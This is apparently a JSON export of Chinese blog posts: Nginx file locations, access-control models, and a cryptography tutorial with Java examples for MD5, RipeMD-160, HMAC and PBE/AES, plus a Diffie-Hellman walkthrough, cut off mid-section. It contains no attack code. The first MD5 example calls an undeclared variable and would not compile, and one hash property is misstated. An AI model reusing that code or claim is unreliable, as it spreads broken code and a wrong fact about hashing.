[{"id":"5681e035a73502206ebf637d9b24cd19","title":"Nginx学习","content":"Nginx快速入门——狂神狂神的笔记：\nNginx快速入门-KuangStudy-文章\nKali中的Linux其中nginx的日志文件在/var/log/nginx\n/var/lib/nginx里面是一些库文件\n配置文件在/etc/nginx\n启动nginx直接使用命令/etc/init.d/nginx即可\nNginx配置详解：Nginx 配置详解 | 菜鸟教程 (runoob.com)\n","slug":"Nginx学习","date":"2022-11-11T07:41:55.000Z","categories_index":"","tags_index":"Nginx","author_index":"kiku"},{"id":"8d37745125c6a8bb3305654c276ebe67","title":"访问控制技术","content":"访问控制技术1、主体、客体和访问授权主体：是一个主动的尸体，它包括用户、用户组、终端、主机或一个应用，主体可以访问客体。\n客体：是一个被动的实体，对客体的访问要受控，它可以是一个字节、字段、记录、程序、文件，或者是一个处理器、存贮器、网络接点等。\n授权访问：指主体访问客体的允许，授权访问对每一对主体和客体来说是给定的。例如：授权访问有读写、执行，读写客体是直接进行的，而执行是搜索文件、执行文件。对用户的访问授权是由系统的安全策略决定的。\n在一个访问控制系统中，区别主体和客体很重要。首先由主体发起访问客体的操作，该操作根据系统的授权或被允许或被拒绝。另外，主体与客体的关系是相对的，当一个主体受到另一个主体的访问， 成为访问目标时，该主体便成为了客体。\n2、访问控制策略访问控制通常有三种策略：\n自主访问控制（Discretionary Access Control）；\n强制访问控制（Mandatory  Access Control）；\n基于角色的访问控制（Role-Based  Access Control）。\n各种访问控制策略之间并不相互排斥，现存计算机系统中通常都是多种访问控制策略并存，系统管理员能够对安全策略进行配置使其达到安全政策的要求。\n\n自主访问控制（DAC）\n\n自主访问控制，又称为随意访问控制，根据用户的身份及允许访问权限决定其访问操作，只要用户身份被确认后，即可根据访问控制表上赋予该用户的权限进行限制性用户访问。使用这种控制方法，用户或应用可任意在系统中规定谁可以访问它们的资源，这样，用户或用户进程就可有选择的与其他用户共享资源。它是一种对单独用户执行访问控制的过程和措施。\n由于DAC对用户提供灵活和易行的数据访问方式，能够适用与许多的系统环境，所以DAC被大量采用、尤其在商业和工业环境的应用上。然而，DAC提供的安全保护容易被非法用户绕过而获得访问。例如，若用户A有权访问文件F，而用户B无权访问F，则一旦A获取F后在传送给B，则B也可访问F，其原因是在自由访问策略中，用户在获得文件的访问后，并没有限制对该文件信息的操作，即并没有控制数据信息的分发。所以DAC提供的安全性还相对较低，不能够对系统资源提供充分的保护，不能抵御特洛伊木马的攻击。\n\n强制访问控制（MAC）\n\n与DAC相比，强制访问控制提供的访问控制机制无法绕过。在强制访问控制中，每个用户及文件都被赋予一定的安全级别，用户不能改变自身或任何客体的安全级别，即不允许单个用户确定访问全新啊，只有系统管理员可以确定用户和组的访问权限。系统通过比较用户和访问的文件的安全级别来决定用户是否可以访问该文件。此外，强制访问控制不允许一个进程生成共享文件，从而防止进程通过共享文件将信息从一个进程传到另一个进程。MAC可以通过使用敏感标签对所有用户的资源强制执行安全策略，即实行强制访问控制。安全级别一般有四级：绝密级（Top Secret），秘密级（Secret），机密级（Confidential），无级别级（Unclassified）\n其级别为从高道题依次为：T&gt;S&gt;C&gt;U，系统根据主体和客体的敏感标记来巨鼎访问模式。通常情况下，访问模式包括：\n下读：用户界别大于文件级别的读操作；\n上写：用户界别集显奥宇文件级别的写操作；\n下写：用户级别大于文件级别的写操作；\n上读：用户界别小于文件级别的读操作。\n上述读写方式都保证了信息流的单向性，显然上读-下写方式保证了数据的完整性（integrity），上写-下读方式则保证了信息的秘密性。\n\n角色访问控制（RBAC）\n\n角色访问策略是根据用户在系统里表现的活动性质而定的，活动性质表明用户充当一定的角色，用户访问系统时，系统必须先检查用户的角色。一个用户可以充当多个角色、一个角色也可以由多个用户担任。角色访问策略具有一下有点：\n便于授权管理，如系统管理员需要修改系统设置等内容时，必须有几个不同角色的用户到场方能操作，从而保证了安全性；\n便于根据工作需要分级，如企业财务部门与非财务部门的员工对企业财务的访问权就可由财务人员这个角色来区分；\n便于赋予最小权限，如即使用户被赋予高级身份时也未必一定要使用，以便减少损失。只有必要时方能拥有权限；\n便于任务分担，不同的角色完成不同的任务；\n便于文件分级管理，文件本身也可分为不同的橘色，如信件、账单等，由不同角色的用户拥有。\n角色访问策略是一种有效而灵活的安全措施。通过定义模型各个部分，可以实现DAC和MAC所需要的控制策略，目前这方面的研究及应用还处于试验探索阶段。\n3、访问控制机制访问控制机制是为检测和防止系统中的未经授权访问，对资源予以保护所采取的软硬件措施和一系列管理措施等。访问控制一般是在操作系统的控制下，按照事先确定的规则决定是否允许主体访问客体，它贯穿于系统工作的全过程，实在文件系统中广泛应用的安全防护方法。\n访问控制矩阵（Access Control Matrix）是最初实现访问控制机制的概念模型，它利用二维矩阵规定了任意主体和任意客体间的访问权限。中矩阵的行代表主体的访问权限属性，矩阵中的列代表课题的访问控制属性，矩阵中的每一格表示所在行的主体对所在列的客体的访问授权。访问控制的任务就是确保系统的操作是按照访问控制矩阵授权的访问来执行的，它是通过应用监控器协调客体对主体的每次访问而实现，这种方法清晰的实现认证与访问控制的相互分离。\n\n\n\n\nFile1\nFile2\nFile3\n\n\n\nJohn\nOwn R W\n\nOwn R W\n\n\nAlice\nR\nOwn R W\nW\n\n\nBob\nR W\nR\n\n\n\n在较大的系统中，访问控制矩阵将变得非常巨大，而且矩阵中的许多格可能都为空，造成很大的存储空间浪费，因此在实际应用下，访问控制很少利用矩阵方式实现。有几种在实际应用中访问控制的几种常用方法：\n\n访问控制表（Access Control Lists，ACLs）\n\n访问控制表是以文件为中心建立访问权限表，表中登记了该文件的访问用户名及访问权隶属关系。利用访问控制表，能够很容易的判断出对于特定客体的授权访问，那些主题可以访问并有哪些访问权限。同样很容易撤销特定客体的授权访问，只要把该客体的访问控制表置为空。\n处于访问控制表的简单，使用，虽然在查询特定主体能够访问的客体时，炫耀遍历查询所有客体的访问控制表，它任然时一种成熟且有效的访问控制实现方法，许多通用的操作系统使用访问控制表来提供访问控制服务。\n\n能力关系表（Capabilities Lists）\n\n能力关系表与ACL相反，是以用户为中心建立访问权限表，表中规定了该用户可访问的文件名及访问权限。\n利用能力关系表可以很方便查询一个主体的所有授权访问。相反，检索具有授权访问特定客体的所有主体，则需要遍历所有主体的能力关系表。\n","slug":"访问控制技术","date":"2022-10-31T02:17:00.000Z","categories_index":"","tags_index":"访问控制","author_index":"kiku"},{"id":"59350d812f080a56659be6ee1dae0a2a","title":"加密与安全","content":"加密与安全编码算法ASCII码就是一种编码，字母A的编码是16进制的0x41，字母B是0x42，以此类推：\n\n\n\n字母\nASCII编码\n\n\n\nA\n0x41\n\n\nB\n0x42\n\n\nC\n0x43\n\n\nD\n0x44\n\n\n…\n…\n\n\n因为ASCII编码最多只能有127个字符，要相对更多的文字进行编码，就需要用Unicode。而中文的“中”编码就是0x4e2d，使用UTF-8则需要3个字节编码。\n\n\n\n汉字\nUnicode编码\nUTF-8编码\n\n\n\n中\n0x4e2d\n0xe4b8ad\n\n\n文\n0x6587\n0xe69687\n\n\n编\n0x7f16\n0xe7bc96\n\n\n…\n…\n…\n\n\n因此，最简单的编码是直接给每个字符制定一个若干字节的整数，复杂一点的编码就需要根据一个已有的编码推算出来。\n比如UTF-8编码，它是一个不定长编码，但可以从给定字符的Unicode编码推算出来。\nURL编码URL编码是浏览器发送数据给服务器时使用的编码，它通常附加在URL的参数部分，例如：\nhttps:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;%E4%B8%AD%E6%96%87\n\n之所以需要URL编码，是因为处于兼容性考虑，很多服务器只识别ASCII字符。如果URL中包含中文、日文这些非ASCII字符时，URL编码有一套规则：\n\n如果字符时AZ，az，0~9以及-、_、·、*，则保持不变；\n如果是其他字符，先转换为UTF-8编码，然后对每个字节以%XX表示。\n\n例如：字符“中”的UTF-8编码是0xe4b8ad，因此，它的URL编码是%E4%B8%AD。URL编码总是大写。\n注意：URL编码是编码算法，不是加密算法。URL编码的目的是吧任意文件数据编码为%前缀表示的文本，编码后的文本仅包含AZ，az，0~9，-，_，·，*和%，便于浏览器和服务器处理。\nBase64编码URL编码是对字符进行编码，表示成%xx的形式，而Base64编码是对二进制数据进行编码，表示成文本格式。\nBase64编码就是通过64个可打印字符来表示二进制数据的方法，且这64个字符中只包含AZ、az、0~9、+、/、=这些字符。它的原理是把3字节的二进制数据按6bit一组，用4个int整数表示，然后查表，把int整数用索引对应到字符，得到编码后的字符串。\nBase64编码表\n\n\n\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n码值\n字符\n\n\n\n0\nA\n8\nI\n16\nQ\n24\nY\n32\ng\n40\no\n48\nw\n56\n4\n\n\n1\nB\n9\nJ\n17\nR\n25\nZ\n33\nh\n41\np\n49\nx\n57\n5\n\n\n2\nC\n10\nK\n18\nS\n26\na\n34\ni\n42\nq\n50\ny\n58\n6\n\n\n3\nD\n11\nL\n19\nT\n27\nb\n35\nj\n43\nr\n51\nz\n59\n7\n\n\n4\nE\n12\nM\n20\nU\n28\nc\n36\nk\n44\ns\n52\n0\n60\n8\n\n\n5\nF\n13\nN\n21\nV\n29\nd\n37\nl\n45\nt\n53\n1\n61\n9\n\n\n6\nG\n14\nO\n22\nW\n30\ne\n38\nm\n46\nu\n54\n2\n62\n+\n\n\n7\nH\n15\nP\n23\nX\n31\nf\n39\nn\n47\nv\n55\n3\n63\n/\n\n\n注意：由于base64编码用了8位字符来表示信息中的6个位，所以base64编码字符串大约比原始值扩大了33%。\n\n可以看到“Son”通过Base64编码转换成了“U29u”。这是刚刚好的情况，3个ASCII字符刚好转换成对应的4个Base64字符。但是，当需要转换的字符数不是3的倍数的情况下该怎么办呢？Base64规定，当需要转换的字符不是3的倍数时，一律采用补0的方式凑足3的倍数，具体如下所示：\n\n每6个Bit为一组，第一组转换后为字符“U”，第二组末尾补4个0转换后为字符“w”。剩下的使用“=”替代。即字符”S“通过Base64编码后为Uw==。这就是Base64的编码过程。\n如果要编码的二进制数据不是3的倍数，最后会剩下1个或2个字符怎么办？Base64用\\x00字节在末尾补足后，再在编码的末尾加上1个或2个=号，表示不了多少字节，解码的时候，会自动去掉。\nBase64编码的目的是把二进制数据变成文本格式，这样在很多文本中就可以处理二进制数据。例如，电子邮件协议就是文本协议，如果要在电子邮件中添加一个二进制文件，就可以用Base64编码，然后以文本的形式传送。\nBase64编码的确定是传输效率会降低，因为它把原始数据的长度增加了1/3。\n和URL编码一样，Base64编码是一种编码算法，不是加密算法。如果把Base64的64个字符编码换成32个、48个或者58个，就可以使用Base32编码，Base48编码和Base58编码。字符越少，编码的效率就会越低。\n哈希算法哈希算法（Hash）又称摘要算法（Digest）它的作用是：对任意一组输入数据进行计算，得到一个固定长度的输出摘要。\n哈希算法最重要的特点就是：\n\n相同的输入一定得到相同的输出；\n不同的输入大概率得不到不同的输出。\n\n哈希算法的目的就是为了验证原始数据是否被篡改。\nJava字符串的haseCode()就是一个哈希算法，它的输入是任意字符串，输出是固定的4字节int整数：\n&quot;hello&quot;.hashCode();\t\t&#x2F;&#x2F;0x5e918d2\n\n两个相同的字符串永远会计算出相同的hashCode，否则基于hashCode定位的HashMap就无法正常工作。这也是为什么当我们自定义一个class时，覆写equals()方法时我们必须正确覆写hashCode()方法。\n哈希碰撞哈希碰撞是指，两个不同的输入得到了相同的输出：\n&quot;AaAaAa&quot;.hashCode(); &#x2F;&#x2F; 0x7460e8c0\n&quot;BBAaBB&quot;.hashCode(); &#x2F;&#x2F; 0x7460e8c0\n\n碰撞时不可避免的。因为输出的字节长度是固定的，String的hashCode()输出是4字节证书，最多只有4294967296种输出，但输入的数据长度是不固定的，有无数种输入。所以，哈希算法是把一个无限的输入集合映射到一个有线的输出集合，必然会产生碰撞。\n我们担心的不应该是碰撞，而是碰撞的概率，因为碰撞概率的高低关系到哈希算法的安全性。一个安全的哈希算法必须满足：\n\n碰撞概率低；\n不能猜测输出。\n\n不能猜测输出是指，输入的任意一个bit的变化会造成输出完全不同，这样就很难从输出反推输入（只能依靠暴力穷举）。假设一种哈希算法有如下规律：\nhashA(&quot;java001&quot;) &#x3D; &quot;123456&quot;\nhashA(&quot;java002&quot;) &#x3D; &quot;123457&quot;\nhashA(&quot;java003&quot;) &#x3D; &quot;123458&quot;\n\n那么很容易从123459反推输入，这种哈希算法就不安全。安全的哈希算法从输出是看不出任何规律的。\nhashB(&quot;java001&quot;) &#x3D; &quot;123456&quot;\nhashB(&quot;java002&quot;) &#x3D; &quot;580271&quot;\nhashB(&quot;java003&quot;) &#x3D; ???\n\n常用的哈希算法有：\n\n\n\n算法\n输出长度（位）\n输出长度（字节）\n\n\n\nMD5\n128bits\n16bytes\n\n\nSHA-1\n160bits\n20bytes\n\n\nRipeMD-160\n160bits\n20bytes\n\n\nSHA-256\n256bits\n32bytes\n\n\nSHA-512\n512bits\n64bytes\n\n\n根据碰撞概率，哈希算法的输出长度越长，就越难产生碰撞，也就越安全。\nMD5和SHA-1算法：java标准库提供了常用的哈希算法，并且有一套统一的接口。以MD5算法为例：\n基本步骤：\n创建爱你MessageDiges实例\n反复调用update(byte[])输入数据\n调用digest()方法获得byte[]数组表示的摘要\n将结果转换为十六进制的字符串\n\n代码示例：import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Arrays;\n \npublic class Demo02 &#123;\n\tpublic static void main(String[] args) &#123;\n\t\tString password &#x3D; &quot;scderfg&quot;;\n\t\t\n\t\ttry &#123;\n\t\t\t&#x2F;&#x2F; 根据当前算法，获取加密工具对象(摘要)\n\t\t\tMessageDigest message &#x3D; MessageDigest.getInstance(&quot;MD5&quot;);\n\t\t\t\n\t\t\t&#x2F;&#x2F; 更新原始数据\n\t\t\tmessage.update(password.getBytes());\n            \n            &#x2F;&#x2F; 完成hash()计算\n            byte[] resultByteArray &#x3D; digest.digest();\n\t\t\t\n\t\t\t&#x2F;&#x2F; 加密后的字节数组，转换字符串\n\t\t\tStringBuilder result &#x3D; new StringBuilder();\n\t\t\t\n\t\t\tfor(byte bite : resultByteArray) &#123;\n\t\t\t\tresult.append(String.format(&quot;%02x&quot;, bite));\n\t\t\t&#125;\n\t\t\t\n\t\t\tSystem.out.println(result);\n\t\t\tSystem.out.println(result.length());\n\t\t\t \n\t\t&#125; catch (NoSuchAlgorithmException e) &#123;\n\t\t\te.printStackTrace();\n\t\t&#125;\n\t&#125;\n&#125;\n\n在Java中使用MD5和SHA-1完全一样，只需要把算法名称改为“SHA-1”。\n类似的，计算SHA-256，我们只需要传入名称“SHA-256”；计算SHA-512，只需要传入名称“SHA-512”。\nRipeMD-160RipeMD-160是一种基于（Mekle-Damgard结构的加密哈希函数，它是比特币标准之一。RipeMD-160是RTPEND算法的增强版本，RipeMD-160算法可以产生出160位的哈希摘要。\n基本步骤：\n把BouncyCastle提供的bcprov-jdk15on-1.70.jar添加到classpath\nJava标准库的java.security包提供了一种标准机制，允许第三番提供商无缝接入。我们要使用BouncyCastle提供的RipeMD160算法，需要先把BouncyCastle注册一下\n接下来步骤和MD5算法相同\n\n代码示例：public class Demo01 &#123;\n\tpublic static void main(String[] args) &#123;\n\t\t\n\t\ttry &#123;\n\t\t\t&#x2F;&#x2F; 注册BouncyCastle提供的通知类对象BouncyCastleProvider\n\t\t\tSecurity.addProvider(new BouncyCastleProvider());\n\t\t\t\n\t\t\t&#x2F;&#x2F; 获取RipeMD160算法的&quot;消息摘要对象&quot;(加密对象)\n\t\t\tMessageDigest md &#x3D; MessageDigest.getInstance(&quot;RipeMD160&quot;);\n\t\t\t\n\t\t\t&#x2F;&#x2F; 更新原始数据\n\t\t\tmd.update(&quot;HelloWord&quot;.getBytes());\n\t\t\t\n\t\t\t&#x2F;&#x2F; 获取信息摘要(加密)\n\t\t\tbyte[] result &#x3D; md.digest();\n\t\t\t\n\t\t\t&#x2F;&#x2F; 消息摘要的字节长度和内容\n\t\t\tSystem.out.println(result.length); &#x2F;&#x2F; 160位&#x3D;20字节\n\t\t\tSystem.out.println(Arrays.toString(result));\n\t\t\t\n\t\t\t&#x2F;&#x2F; 16进制内容字符串\n\t\t\tString hex &#x3D; new BigInteger(1,result).toString(16);\n\t\t\tSystem.out.println(hex.length()); &#x2F;&#x2F; 20字节&#x3D;40字符\n\t\t\tSystem.out.println(hex);\n\t\t\t\n\t\t&#125; catch (NoSuchAlgorithmException e) &#123;\n\t\t\te.printStackTrace();\n\t\t&#125;\n\t&#125;\n&#125;\n\n使用哈希口令时，还要注意防止彩虹表攻击。\n什么事彩虹表呢？如果只拿到MD5，从MD5反推明文口令，只能使用暴力穷举的方法。\n然而黑客并不笨，暴力穷举会消耗大量的算力和时间。但是，如果有一个预先计算好的常用口令和它们的MD5的对照表：\n\n\n\n常用口令\nMD5\n\n\n\nhello123\nf30aa7a662c728b7407c54ae6bfd27d1\n\n\n12345678\n25d55ad283aa400af464c76d713c07ad\n\n\npassw0rd\nbed128365216c019988915ed3add75fb\n\n\n19700101\n570da6d5277a646f6552b8832012f5dc\n\n\n…\n…\n\n\n20201231\n6879c0ae9117b50074ce0a0d4c843060\n\n\n这个表就是彩虹表。如果用户使用了常用口令，黑客从MD5以下就能反查到原始口令：\nbob的MD5：f30aa7a662c728b7407c54ae6bfd27d1，原始口令：hello123\n这就是为什么不要使用常用密码，以及不要使用生日作为密码的原因。\n即使用户使用了常用口令，我们也可以采取措施来地狱彩虹表攻击，方法是对每个口令额外增加随机数，这个方法称之为加盐（salt）：\ndigest &#x3D; md5(salt+inputPassword)\n\n经过加盐处理的数据库表，内容如下：\n\n\n\nusername\nsalt\npassword\n\n\n\nbob\nH1r0a\na5022319ff4c56955e22a74abcc2c210\n\n\n加盐的目的在于使黑客的彩虹表失效，即使用户使用常用口令，也无法从MD5反推原始口令。\nHmac算法Hmac算法就是一种基于迷药的消息认证码算法，它的全称是Hash-based Message Authentication Code，是一种更安全的消息摘要算法。\nHmac算法总是和某种哈希算法配合起来用的。例如，我们使用MD5算法，对应的就是HmacMD5算法，它相当于“加盐”的MD5：\nHmacMD5 ≈ md5(secure_random_key, input)\n\n因此，HmacMD5可以看做带有一个安全的key的MD5。使用HmacMD5而不是用MD5家salt，有如下好处：\n\nHmacMD5使用的key长度是64字节，更安全；\nHmac是标准算法，同时适用与SHA-1等其他哈希算法；\nHmac输出和原有的哈希算法长度一致。\n\n可见，Hmac本质上就是把key混入摘要的算法。验证此哈希时，除了原始的输入数据，还要提供key。\n为了保证安全，我们不会自己制定key，而是通过Java标准库的KeyGenerator生成一个安全的随机的key。下面是使用HmacMD5的代码：\nimport java.math.BigInteger;\nimport javax.crypto.*;\npublic class Main &#123;\n    public static void main(String[] args) throws Exception &#123;\n        KeyGenerator keyGen &#x3D; KeyGenerator.getInstance(&quot;HmacMD5&quot;);\n        SecretKey key &#x3D; keyGen.generateKey();\n        &#x2F;&#x2F; 打印随机生成的key:\n        byte[] skey &#x3D; key.getEncoded();\n        System.out.println(new BigInteger(1, skey).toString(16));\n        Mac mac &#x3D; Mac.getInstance(&quot;HmacMD5&quot;);\n        mac.init(key);\n        mac.update(&quot;HelloWorld&quot;.getBytes(&quot;UTF-8&quot;));\n        byte[] result &#x3D; mac.doFinal();\n        System.out.println(new BigInteger(1, result).toString(16));\n    &#125;\n&#125;\n\n和MD5相比，使用HmacMD5的步骤是：\n\n通过名称HmacMD5获取KeyGenerator实例；\n通过KeyGenerator创建一个SecretKey实例；\n通过名称HmacMD5获取Mac实例；\n用SecretKey初始化Mac实例；\n对Mac实例反复调用update(byte[])输入数据；\n调用Mac实例的doFinal()获取最终的哈希值。\n\n我们可以用Hmac算法取代原有的自定义的加盐算法，因此，存储用户名和口令的数据库结构如下：\n\n\n\nusername\nsecret_key (64 bytes)\npassword\n\n\n\nbob\na8c06e05f92e…5e16\n7e0387872a57c85ef6dddbaa12f376de\n\n\n有了Hmac计算的哈希和SecretKey，我们想要验证怎么办？这时，SecretKey不能从KeyGenerator生成，而是从一个byte[]数组恢复：\nimport java.util.Arrays;\nimport javax.crypto.*;\nimport javax.crypto.spec.*;\npublic class Main &#123;\n    public static void main(String[] args) throws Exception &#123;\n        byte[] hkey &#x3D; new byte[] &#123; 106, 70, -110, 125, 39, -20, 52, 56, 85, 9, -19, -72, 52, -53, 52, -45, -6, 119, -63,\n                30, 20, -83, -28, 77, 98, 109, -32, -76, 121, -106, 0, -74, -107, -114, -45, 104, -104, -8, 2, 121, 6,\n                97, -18, -13, -63, -30, -125, -103, -80, -46, 113, -14, 68, 32, -46, 101, -116, -104, -81, -108, 122,\n                89, -106, -109 &#125;;\n\n        SecretKey key &#x3D; new SecretKeySpec(hkey, &quot;HmacMD5&quot;);\n        Mac mac &#x3D; Mac.getInstance(&quot;HmacMD5&quot;);\n        mac.init(key);\n        mac.update(&quot;HelloWorld&quot;.getBytes(&quot;UTF-8&quot;));\n        byte[] result &#x3D; mac.doFinal();\n        System.out.println(Arrays.toString(result));\n        &#x2F;&#x2F; [126, 59, 37, 63, 73, 90, 111, -96, -77, 15, 82, -74, 122, -55, -67, 54]\n    &#125;\n\n恢复SecretKey的语句就是new SecretKeySpec(hkey, &quot;HmacMD5&quot;)。\nHmac算法是一种标准的基于密钥的哈希算法，可以配合MD5、SHA-1等哈希算法，计算的摘要长度和原摘要算法长度相同。\n对称加密算法对称加密算法就是传统的用一个密码进行加密和解密。\n常用的对称加密算法有:\n\nDES\n\n已破解，不再安全，基本没有企业在用，是对称加密算法的及时，具有学习价值。\n密钥长度56（JDK）、56/64（BC）。\n\n3DES\n\n早于AES出现来替代DES。\n计算密钥时间太长、加密效率不高，所以也基本上不用。\n密钥长度112/168（JDK）、128/192（BC）。\n\nAES\n\n最常用的对称加密算法\n密钥建立时间短、灵敏性好、内存需求低。\n实际使用中，使用工作模式为CTR（最好用BC去实现），此工作模式需要引入IV参数（16位的字节数组）。\n秘钥长度128/192/256，其中192与256需要配置无政策限制权限文件（JDK6）\n填充模式最常用的两种PKCS5Padding和PKCS7Padding，其中后者只有BC独有。\n\nIDEA\n\n常用的电子邮件加密算法。\n工作模式只有ECB。密钥长度128位。\n\nPBE\n\n综合了消息摘要算法和对称加密算法，最常见的是PBEWithMD5AndDES。\n工作模式只有CBC（已丧失安全性，不推荐使用），所以PBE也不推荐使用了。\n加密模式\n\n\n加密模式(英文）\n加密模式（中文）\n介绍\n\n\n\nElectronic Code Book(ECB)\n电子密码本模式\n最基本的加密模式，也就是通常理解的加密，相同的明文将永远加密成相同的密文，无初始向量，容易受到密码本重放攻击，一般情况下很少用\n\n\nCipher Block Chaining(CBC)\n密码分组链接模式\n明文被加密前要与前面的密文进行异或运算后再加密，因此只要选择不同的初始向量，相同的密文加密后会形成不同的密文，这是目前应用最广泛的模式。CBC加密后的密文是上下文相关的，但明文的错误不会传递到后续分组，但如果一个分组丢失，后面的分组将全部作废(同步错误)。\n\n\nCipher Feedback Mode(CFB)\n加密反馈模式\n类似于自同步序列密码，分组加密后，按8位分组将密文和明文进行移位异或后得到输出同时反馈回移位寄存器，优点最小可以按字节进行加解密，也可以是n位的，CFB也是上下文相关的，CFB模式下，明文的一个错误会影响后面的密文(错误扩散)。\n\n\nOutput Feedback Mode(OFB)\n输出反馈模式\n将分组密码作为同步序列密码运行，和CFB相似，不过OFB用的是前一个n位密文输出分组反馈回移位寄存器，OFB没有错误扩散问题。\n\n\n小结：对称加密算法使用同一个密钥进行加密和解密，常用算法有DES、AES和IDEA等；\n密钥长度由算法设计决定，AES的秘钥长度是128/192/256位；\n使用对称加密算法需要指定算法名称、工作模式和填充模式。\n口令加密算法对称加密算法决定了口令必须是固定长度，然后对明文进行分块加密。又因为安全需求，口令长度往往都是128位以上，即至少16个字符。\n但是我们平时使用的加密软件，输入6位、8位都可以，难道加密方式不一样？\n实际上用户输入的口令并不能直接作为AES的秘钥进行加密（除非长度恰好是128/192/256位），并且用户输入的口令一般都有规律，安全性远远不如安全随机数产生的随机口令。因此，用户输入的口令，通常还需要使用PBE算法，采用随机数杂凑计算出真正的密钥，再进行加密。\nPBE就是Password Based Encryption的缩写，它的作用如下：\nkey &#x3D; generate(userPassword, secureRandomPassword);\n\nPBE的作用就是把用户输入的口令和一个安全随机的口令采用杂凑后计算出真正的密钥。以AES密钥为例，我们让用户输入一个口令，然后生成一个随机数，通过PBE算法计算出真正的AES口令，在进行加密，代码如下：\npublic class Main &#123;\n    public static void main(String[] args) throws Exception &#123;\n        &#x2F;&#x2F; 把BouncyCastle作为Provider添加到java.security:\n        Security.addProvider(new BouncyCastleProvider());\n        &#x2F;&#x2F; 原文:\n        String message &#x3D; &quot;Hello, world!&quot;;\n        &#x2F;&#x2F; 加密口令:\n        String password &#x3D; &quot;hello12345&quot;;\n        &#x2F;&#x2F; 16 bytes随机Salt:\n        byte[] salt &#x3D; SecureRandom.getInstanceStrong().generateSeed(16);\n        System.out.printf(&quot;salt: %032x\\n&quot;, new BigInteger(1, salt));\n        &#x2F;&#x2F; 加密:\n        byte[] data &#x3D; message.getBytes(&quot;UTF-8&quot;);\n        byte[] encrypted &#x3D; encrypt(password, salt, data);\n        System.out.println(&quot;encrypted: &quot; + Base64.getEncoder().encodeToString(encrypted));\n        &#x2F;&#x2F; 解密:\n        byte[] decrypted &#x3D; decrypt(password, salt, encrypted);\n        System.out.println(&quot;decrypted: &quot; + new String(decrypted, &quot;UTF-8&quot;));\n    &#125;\n\n    &#x2F;&#x2F; 加密:\n    public static byte[] encrypt(String password, byte[] salt, byte[] input) throws GeneralSecurityException &#123;\n        PBEKeySpec keySpec &#x3D; new PBEKeySpec(password.toCharArray());\n        SecretKeyFactory skeyFactory &#x3D; SecretKeyFactory.getInstance(&quot;PBEwithSHA1and128bitAES-CBC-BC&quot;);\n        SecretKey skey &#x3D; skeyFactory.generateSecret(keySpec);\n        PBEParameterSpec pbeps &#x3D; new PBEParameterSpec(salt, 1000);\n        Cipher cipher &#x3D; Cipher.getInstance(&quot;PBEwithSHA1and128bitAES-CBC-BC&quot;);\n        cipher.init(Cipher.ENCRYPT_MODE, skey, pbeps);\n        return cipher.doFinal(input);\n    &#125;\n\n    &#x2F;&#x2F; 解密:\n    public static byte[] decrypt(String password, byte[] salt, byte[] input) throws GeneralSecurityException &#123;\n        PBEKeySpec keySpec &#x3D; new PBEKeySpec(password.toCharArray());\n        SecretKeyFactory skeyFactory &#x3D; SecretKeyFactory.getInstance(&quot;PBEwithSHA1and128bitAES-CBC-BC&quot;);\n        SecretKey skey &#x3D; skeyFactory.generateSecret(keySpec);\n        PBEParameterSpec pbeps &#x3D; new PBEParameterSpec(salt, 1000);\n        Cipher cipher &#x3D; Cipher.getInstance(&quot;PBEwithSHA1and128bitAES-CBC-BC&quot;);\n        cipher.init(Cipher.DECRYPT_MODE, skey, pbeps);\n        return cipher.doFinal(input);\n    &#125;\n&#125;\n\n使用PBE时，我们还需要引入BouncyCastle，并指定算法是PBEwithSHA1and128bitAES-CBC-BC。观察代码，实际上真正的AES密钥是调用Cipher的init()方法时同时传入SecretKey和PBEParameterSpec实现的。在创建PBEParameterSpec的时候，我们还指定了循环次数1000，循环次数越多，暴力破解需要的计算量就越大。\n如果我们把salt和循环次数固定，就得到了一个通用的“口令”加密软件。如果我们把随机生成的salt存储在U盘，就得到了一个“口令”加USB Key的加密软件，它的好处在于，及时用户使用了一个非常弱的口令，没有USB Key仍然无法解密，因为USB Key存储的随机数密钥安全性非常高。\n小结：PBE算法通过用户口令和安全的随机salt计算出Key，然后再进行加密；\nKey通过口令和安全的随机salt计算得出，大大提高了安全性；\nPBE算法内部使用的仍然是标准对称加密算法（例如AES）。\n密钥交换算法根据对称加密算法，我们需要安全的进行传输密钥。\n密钥交换算法即DH算法（Diffle-Hellman算法）解决了密钥在双方不直接传递密钥的情况下完成秘钥交换，这个神奇的交换原理完全由数学理论支持。\n我们来看DH算法交换密钥的步骤。假设甲乙双方需要传递密钥，他们之间可以这么做：\n\n甲首选选择一个素数p，例如509，底数g，任选，例如5，随机数a，例如123，然后计算A=g^a mod p，结果是215，然后，甲发送p＝509，g=5，A=215给乙；\n乙方收到后，也选择一个随机数b，例如，456，然后计算B=g^b mod p，结果是181，乙再同时计算s=A^b mod p，结果是121；\n乙把计算的B=181发给甲，甲计算s＝B^a mod p的余数，计算结果与乙算出的结果一样，都是121。\n\n所以最终双方协商出的密钥s是121。注意到这个密钥s并没有在网络上传输。而通过网络传输的p，g，A和B是无法推算出s的，因为实际算法选择的素数是非常大的。\n所以，更确切地说，DH算法是一个密钥协商算法，双方最终协商出一个共同的密钥，而这个密钥不会通过网络传输。\n如果我们把a看成甲的私钥，A看成甲的公钥，b看成乙的私钥，B看成乙的公钥，DH算法的本质就是双方各自生成自己的私钥和公钥，私钥仅对自己可见，然后交换公钥，并根据自己的私钥和对方的公钥，生成最终的密钥secretKey，DH算法通过数学定律保证了双方各自计算出的secretKey是相同的。\n但是DH算法并未解决中间人攻击，即甲乙双方并不能确保与自己通信的是否真的是对方。消除中间人攻击需要其他方法。\n非对称加密算法 非对称密钥就是加密和机密使用的不是相同的密钥：只有同一个公钥-私钥对才能正常加解密。                                                                   